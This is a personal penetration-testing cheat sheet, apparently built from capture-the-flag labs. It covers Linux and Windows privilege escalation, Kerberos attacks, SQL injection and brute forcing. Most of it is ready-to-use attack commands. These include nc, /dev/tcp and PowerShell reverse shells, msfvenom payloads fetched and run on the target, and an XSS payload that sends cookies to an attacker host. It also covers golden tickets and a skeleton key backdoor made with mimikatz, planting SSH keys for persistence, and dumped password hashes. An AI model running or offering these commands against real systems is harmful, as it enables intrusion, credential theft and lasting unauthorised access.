# Tools

### John

#### salted hash(Ex. sha512)

first, password file should be <pass>$<salt>

```bash
john --wordlist=<dict file> --format='dynamic=sha512($p.$s)' <pass file>
```



#### SSH Keys(id_rsa)

```
ssh2john <id_rsa> > <outputfile>
```

OR

```
python3 /opt/ssh2john.py
```

OR

```
python /usr/share/john/ssh2john.py
```

### hashcat

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```



### GPG, PGP

```
gpg --import priv.key
gpg <filename>.gpg
```



# Linux

### nmap

- samba script on nmap

  ```bash
  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>

- rpcbind

  when port 111 access to network file system

  ```bash
  nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
  ```

### samba, SMB

- ```bash
  smbmap -H <IP>
  ```

- ```bash
  smbclient //<ip>/anonymous
  ```

- ```bash
  smbclient //<ip>/<user> --user=<user>
  ```

- recursively download the SMB share

  ```bash
  smbget -R smb://<ip>/anonymous
  ```

### FTP

```bash
ftp <IP>
username : anonymous
```

### FTP ProFtpd

- copy files/directories from one place to another on the server 

  ```
  SITE CPFR
  SITE CPTO
  ```

  ```
  nc 10.10.41.232 21                                               
  220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.41.232]
  SITE CPFR /home/kenobi/.ssh/id_rsa 
  350 File or directory exists, ready for destination name
  SITE CPTO /var/tmp/id_rsa
  250 Copy successful
  ```

  mount the /var/tmp directory to our machine

  ```bash
  mkdir /mnt/kenobiNFS
  mount machine_ip:/var /mnt/kenobiNFS
  ls -la /mnt/kenobiNFS
  ```

  unmount

  ```bash
  umount /mnt/kenobi
  rm -r /mnt/kenobi
  ```

### Reverse SSH (SSH Port Forwarding)

Forward the traffic to a server I own and view blocked site by firewall, or if internal service is running.  Ex,

```bash
ssh -L 9000:imgur.com:80 user@example.com
```

Going to localhost:9000 on my machine, will load imgur traffic using my other server.

- practice

  ```bash
  <targetmachine>@<ssh> ~$ ss -tulpn
  <localmachine>@kali ~$ ssh -L <LPORT>:localhost:<RPORT> <username>@<ip>
  ```

  on browser, type "localhost:<LPORT>"

### Redis

[Hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

```
redis-cli -h <IP>
AUTH <password>
INFO
SELECT 0
KEYS *
GET <key>
```

### Rsync

```
nc <IP> 873
@RSYNCD: 31.0
#list
```

List files

```
rsync -av --list-only rsync://<IP>/<shared_name>
```

Copy/Upload files

```
rsync -av rsync://<IP>:873/<shared_name>/<file_path> .
rsync -av <file> rsync://<IP>:873/<shared_name>
```

Copy/Upload files if you have credential

```
rsync -av authorized_keys rsync://username@<IP>/home_user/.ssh
```



## Privilege Escalation

First, check /opt and /etc/<service> 

### SUID/GUID

- To search the a system for  files with SUID/GUID

  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
  
- If bash script is owned by root but still id isn't change, try this;

  ```bash
  -rwsr-sr-x 1 root  root  1113504 Jul 22  2020  .suid_bash
  ./.suid_bash -p
  ```

### Crontab

#### Wildcards*

Set if run * in home directory

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f" > shell.sh 
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh" 
touch "/var/www/html/--checkpoint=1"
```

don't forget to rm shell.sh, ""--check~.sh", and "--check~point=1"

#### Writable file

```bash
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh
```

replace the contents of overwrite.sh to below.

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

#### PATH variable

- the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

  As this file runs as the root users privileges, we can manipulate our path gain a root shell.

  ```bash
  kenobi@kenobi:~$ strings /usr/bin/menu
  curl -I localhost
  uname -r
  ifconfig
  ```

  ```bash
  kenobi@kenobi:/tmp$ echo /bin/bash > curl
  kenobi@kenobi:/tmp$ chmod +x curl
  kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
  kenobi@kenobi:/tmp$ /usr/bin/menu
  ```

### NFS

In /etc/exports, no_root_squash flag means all folders in NFS is owned by root and have root priviledge.

Need to be connected from inside, ex. reverse ssh! On victim machine,

```bash
rpcinfo -p
```

to check which port is open for nfs. Then, reverse ssh via that port.

```bash
<attacker> $ ssh -L 2049:localhost:2049 -i <id_rsa> <user>@<ip>
<victim> $ showmount -e localhost
<attacker> $ mkdir /tmp/nfs
<attacker> $ sudo mount -t nfs localhost:/ /tmp/nfs
```

#### Get root

- Put shell

  ```bash
  msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
  chmod +xs /tmp/nfs/shell.elf
  ```

  ```bash
  /tmp/shell.elf
  ```

- Copy bash

  On victim machine

  ```
  cp /bin/bash bash
  ```

  On attacker machine, in /tmp/nfs

  ```
  sudo chown root:root bash
  sudo chmod 4777 bash
  ```

  On victim machine

  ```
  ./bash -p
  ```

unmount

```bash
sudo umount /tmp/nfs
rm -r /tmp/nfs
```



### Sudo

execute command as  other user

```
sudo -u <user> <command>
```

### Sudoers

Ex. `/etc/sudoers.d/alice:alice ssalg-gnikool = (root) NOPASSWD: /bin/bash`

```bash
 sudo -l -h ssalg-gnikool
```

If you see `User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash`, then

```bash
sudo -h ssalg-gnikool /bin/bash
```

### SQL expose

on attacker machine,

```bash
mysql -u root -p
show databases;
use <database>;
show tables;
SELECT * FROM <table>;
```

### Enumerate services (Ex. TeamCity)

```
<target> $ ss -tulpn
```

If you find ports only for local, Ex. **[::ffff:127.0.0.1]:8111**

```
<target> $ wget http://127.0.0.1:8111
```

```
ssh -L 8111:127.0.0.1:8111 <user>@<IP> -i id_rsa
```

on Browser, search `http://localhost:8111`

```
<ssh> $ grep -iR "authentication token" 2>/dev/null
```



## Persistence

### Adding SSH key

On attacker machine,

```bash
ssh-keygen -f <output id_rsa file name> -C ""
```

copy the output to /home/<victim>/.ssh/authorized_keys

```bash
echo "OUTPUT_OF_<victim>.PUB" >> /home/<victim>/.ssh/authorized_keys
```

#### Activate SSH root login

In /etc/ssh/sshd_config, set as "PermitRootLogin yes" or "PermitRootLogin prohibit-password"

## Others

- find particular file

  ```bash
  find / -type f -iname '*.flag' -exec echo {} \; -exec cat {} \;  2>/dev/null
  ```



# Windows

Windows privilege escalation - PowerUp.ps1

initial access - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) ([Nishang](https://github.com/samratashok/nishang) is a useful set of scripts for initial access, enumeration and privilege escalation)

- reverse shell

  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=10.13.35.230 LPORT=12345 -e x86/shikata_ga_nai -f exe -o ASCService.exe
  ```

- switch to meterpreter shell

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
  python3 -m http.server <port>
  ```

  then, on windows

  ```powershell
  powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
  ```

  on metasploit

  ```bash
  use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
  ```

  on windows

  ```powershell
  Start-Process "shell-name.exe"
  ```

### Buffer Overflow

[Tutorial](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

### meterpreter

- convert a shell to meterpreter shell

  ```bash
  post/multi/manage/shell_to_meterpreter
  ```

- migrate to other process

  ```bash
  meterpreter > getuid
  meterpreter > getsystem
  meterpreter > ps
  meterpreter > migrate <process ID>      
  ```

  spoolsv.exe is a good option

- dump hashes

  ```bash
  meterpreter > hashdump
  ```

  passwords are also often stored at C:\Windows\System32\config

- powershell

  ```bash
  meterpreter > load powershell
  meterpreter > powershell_shell
  ```

- shell

  ```bash
  meterpreter > shell
  ```

- upload files

  ```bash
  meterpreter > upload <file>
  ```

### shell

- ls command

  ```powershell
  > dir
  ```





## Privilege Escalation

### token impersonation

```powershell
PS C:\Users\bruce\Desktop> whoami /priv
```

check any of below tokens are enabled;

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

```bash
meterpreter > load incognito (or "use incognito")
meterpreter > list_tokens -g
meterpreter > impersonate_token "BUILTIN\Administrators"
```

Don't forget to migrate!



### Impacket

```
secretsdump.py <user>@<domain>
```

After obtain NT hashes, use **evil-winrm**



## Attack Kerberos

Attack Privilege Requrements-

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required



### Enumeration w/ Kerbrute

Add victim IP to /etc/hosts as CONTROLLER.local (DNS_Domain_Name in nmap)

On attacker machine,

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local <User.txt>
```



### Harvesting & Brute-Forcing Tickets w/ Rubeus

Harvesting gathers tickets  that are being transferred to the KDC and saves them for use in other  attacks such as the pass the ticket attack.

On victim machine,

```
Rubeus.exe harvest /interval:30
```

add the IP and domain name to the hosts file from the machine by using the echo command:

```
echo 10.10.122.227 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

take a given password and "spray" it against all found users then give the .kirbi TGT for that user 

```
Rubeus.exe brute /password:Password1 /noticket
```



### Kerberoasting w/ Rubeus & Impacket

- method 1: Rubeus

  dump the Kerberos hash of any kerberoastable users

  ```
  Rubeus.exe kerberoast
  ```

- method 2: Impacket

  dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like  Rubeus does; however, this does not have to be on the targets machine  and can be done remotely.

  ```
  cd /usr/share/doc/python3-impacket/examples/
  sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.122.227 -request
  hashcat -m 13100 -a 0 hash.txt rockyou.txt
  ```

- query ASReproastable accounts w/Impacket 

  ```
  GetNPUsers.py <domain>/<user>
  ```

  

### AS-REP Roasting w/ Rubeus

```
Rubeus.exe asreproast
```

Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User...

hashcat mode 18200



### Pass the Ticket w/ mimikatz

minikatz is very good post-exploitation tool

#### Prepare Mimikatz & Dump Tickets

Ensure outputs [output '20' OK] if it does not that means you do not have the administrator  privileges to properly run mimikatz

```
> mimikatz.exe
privilege::debug
```

export all of the base64 encoded .kirbi tickets into the directory that you are currently in

```
sekurlsa::tickets /export
```

#### Pass the Ticket w/ Mimikatz

run this command inside of  mimikatz with the ticket that you harvested from earlier. It will cache  and impersonate the given ticket

```
kerberos::ptt <ticket>
```

exit minikaz.

verifying that we successfully impersonated the ticket by listing our cached tickets.

```
> klist
```



### Golden/Silver Ticket Attacks w/ mimikatz

A silver ticket can  sometimes be better used in engagements rather than a golden ticket  because it is a little more stealth. The approach to creating one is the exact same. A silver ticket is limited to the service that is targeted whereas a golden ticket has access to any  Kerberos service.

#### Dump the krbtgt hash

```
> mimikatz.exe
privilege::debug
```

dump the hash as well as  the security identifier needed to create a Golden Ticket. To create a  silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService  account.

```
lsadump::lsa /inject /name:krbtgt
```

#### Create a Golden/Silver Ticket

Creating a golden ticket. To create a silver ticket simply put a service NTLM hash into the krbtgt  slot, the sid of the service account into sid, and change the id to  1103.

```
Kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<ticket> /id:<id>
```

#### Use the Golden/Silver Ticket to access other machines

open a new elevated command prompt with the given ticket in mimikatz.

```
misc::cmd
```

### Kerberos Backdoors w/ mimikatz

#### Preparing Mimikatz

```
> mimikatz.exe
privilege::debug
```

#### Installing the Skeleton Key w/ mimikatz

```
misc::skeleton
```

#### Accessing the forest

- Ex1

  The share will now be accessible without the need for the Administrators password

  ```
  net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
  ```

- Ex2

  access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

  ```
  dir \\Desktop-1\c$ /user:Machine1 mimikatz
  ```

  

# Web

## Shells

### netcat 

- netcat stabilization

  - 1

    ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    <Ctrl + z>
    stty raw -echo; fg
    ```

  - 2 install rlwrap first

    ```bash
    rlwrap nc -lvnp <port>
    stty raw -echo; fg
    ```

- common shell payloads

  - linux bind shell

    ```bash
    mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    ```

  - linux reverse shell

    ```bash
    mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    ```

    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
    ```
  
    

  - windows one-liner php reverse shell
  
    ```bash
    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
  
  for others, check [PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)



## XSS

### Cookie

payload

```html
<script>document.location='http://<attacker_IP>:<port>/XSS/grabber.php?c='+document.cookie</script>
```

```bash
nc -lvnp <port>
```

on browser console,

```javascript
document.cookie = "token=<admin_cookie>"
```



## SQL Injection

### union

Set if we have four selected fields.

Request;

```sql
http://<IP>/admin?user=0 union select 1,2,3,4 -- -
```

Response;

```html
  <div>
          User 2 <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
```

Seems the query returns 4 columns in which value of column 1 and 2 are reflected on the output.



Request;

```sql
user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
```

Response;

```sql
information_schema,marketplace
```

we have two tables.



Request;

```sql
user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -
```

Response;

```html
<div>
          User items,messages,users <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
```

There are three tables. ie users,messages and items.



Request;

```sql
/admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'-- -
```

Response;

```html
<br />
          ID: id
,username
,password
,isAdministrator
 <br />
```

There are 4 colums: ie id,username,password and isAdministrator. So lets dump all the contents of the users table.



Request;

```sql
/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
```

Response;

```html
 <div>
          User 1:system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW:0
,2:michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q:1
,3:jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG:1
,4:a:$2b$10$O9iXKuQ.xG1ckYhmmYDtzeG2V6O1D8gIUHCrg.iDOK4j3Co.Qgy16:0
 <br />
```

password hashes





## Tools

### SCP (Secure copy via ssh)

- copy from REMOTE to LOCAL

  ```
  scp <user>@<remote_IP>:<path> <local_path>
  ```

- copy from LOCAL to REMOTE

  ```
  scp <loacl_path> <user>@<remote_IP>:<path>
  ```




### wfuzz (scan subdomain)

```
wfuzz -c -f subdomains.txt -w ../../Tools/wordlists/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hw 290
```



### Nikto

vulnerability scanner

```bash
nikto -h <ip>
```



### hydra

```bash
hydra -P <wordlist> -v <ip> <protocol>
```

- POST from burpsuite

  ```bash
  hydra -l <username> -P .<password list> $ip  http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:loginError'
  ```

- Windows Remote Desktop

  ```bash
  hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
  ```

- SSH

  ```bash
  hydra -l admin -P ../../Tools/wordlists/rockyou.txt ssh://10.10.20.207
  ```



### SQLMap

intercept a request with Burpsuite, and save to .txt file. burp suite

```bash
sqlmap -r <file>.txt --dbms=mysql --dump
```

### Evil-WinRM

use hash to gain shell

```
evil-winrm -i 10.10.163.204 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```



# OSINT

## Files

### exiftool

```
exiftool <filepath>
```

### hexedit

edit header hex to repair broken files 

```
hexedit <file>
```

### Steghide

```
steghide info <file>
```

```
steghide extract -sf <file>
```



### Wingle.net

search locations with BSSID

# Others

- If IP addr doesn't work, edit /etc/hosts

## Python

Imported files can be alternative.

Ex. in a.py,

```
import random
...
```

You can make random.py 

```
echo '/bin/bash' > random.py
```



## HTML

- If you wanna overwrite homepage HTML, rewrite index.html and then change DocumentRoot in /etc/apache2/sites-enabled/000-defaulter or /etc/httpd/conf/httpd.conf

- If a website was restricted by firefox, search `about:config` and search for `network.security.ports.banned.override`, then choose `string` and change value to `22`

  

## ROT13

```
echo '<word>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

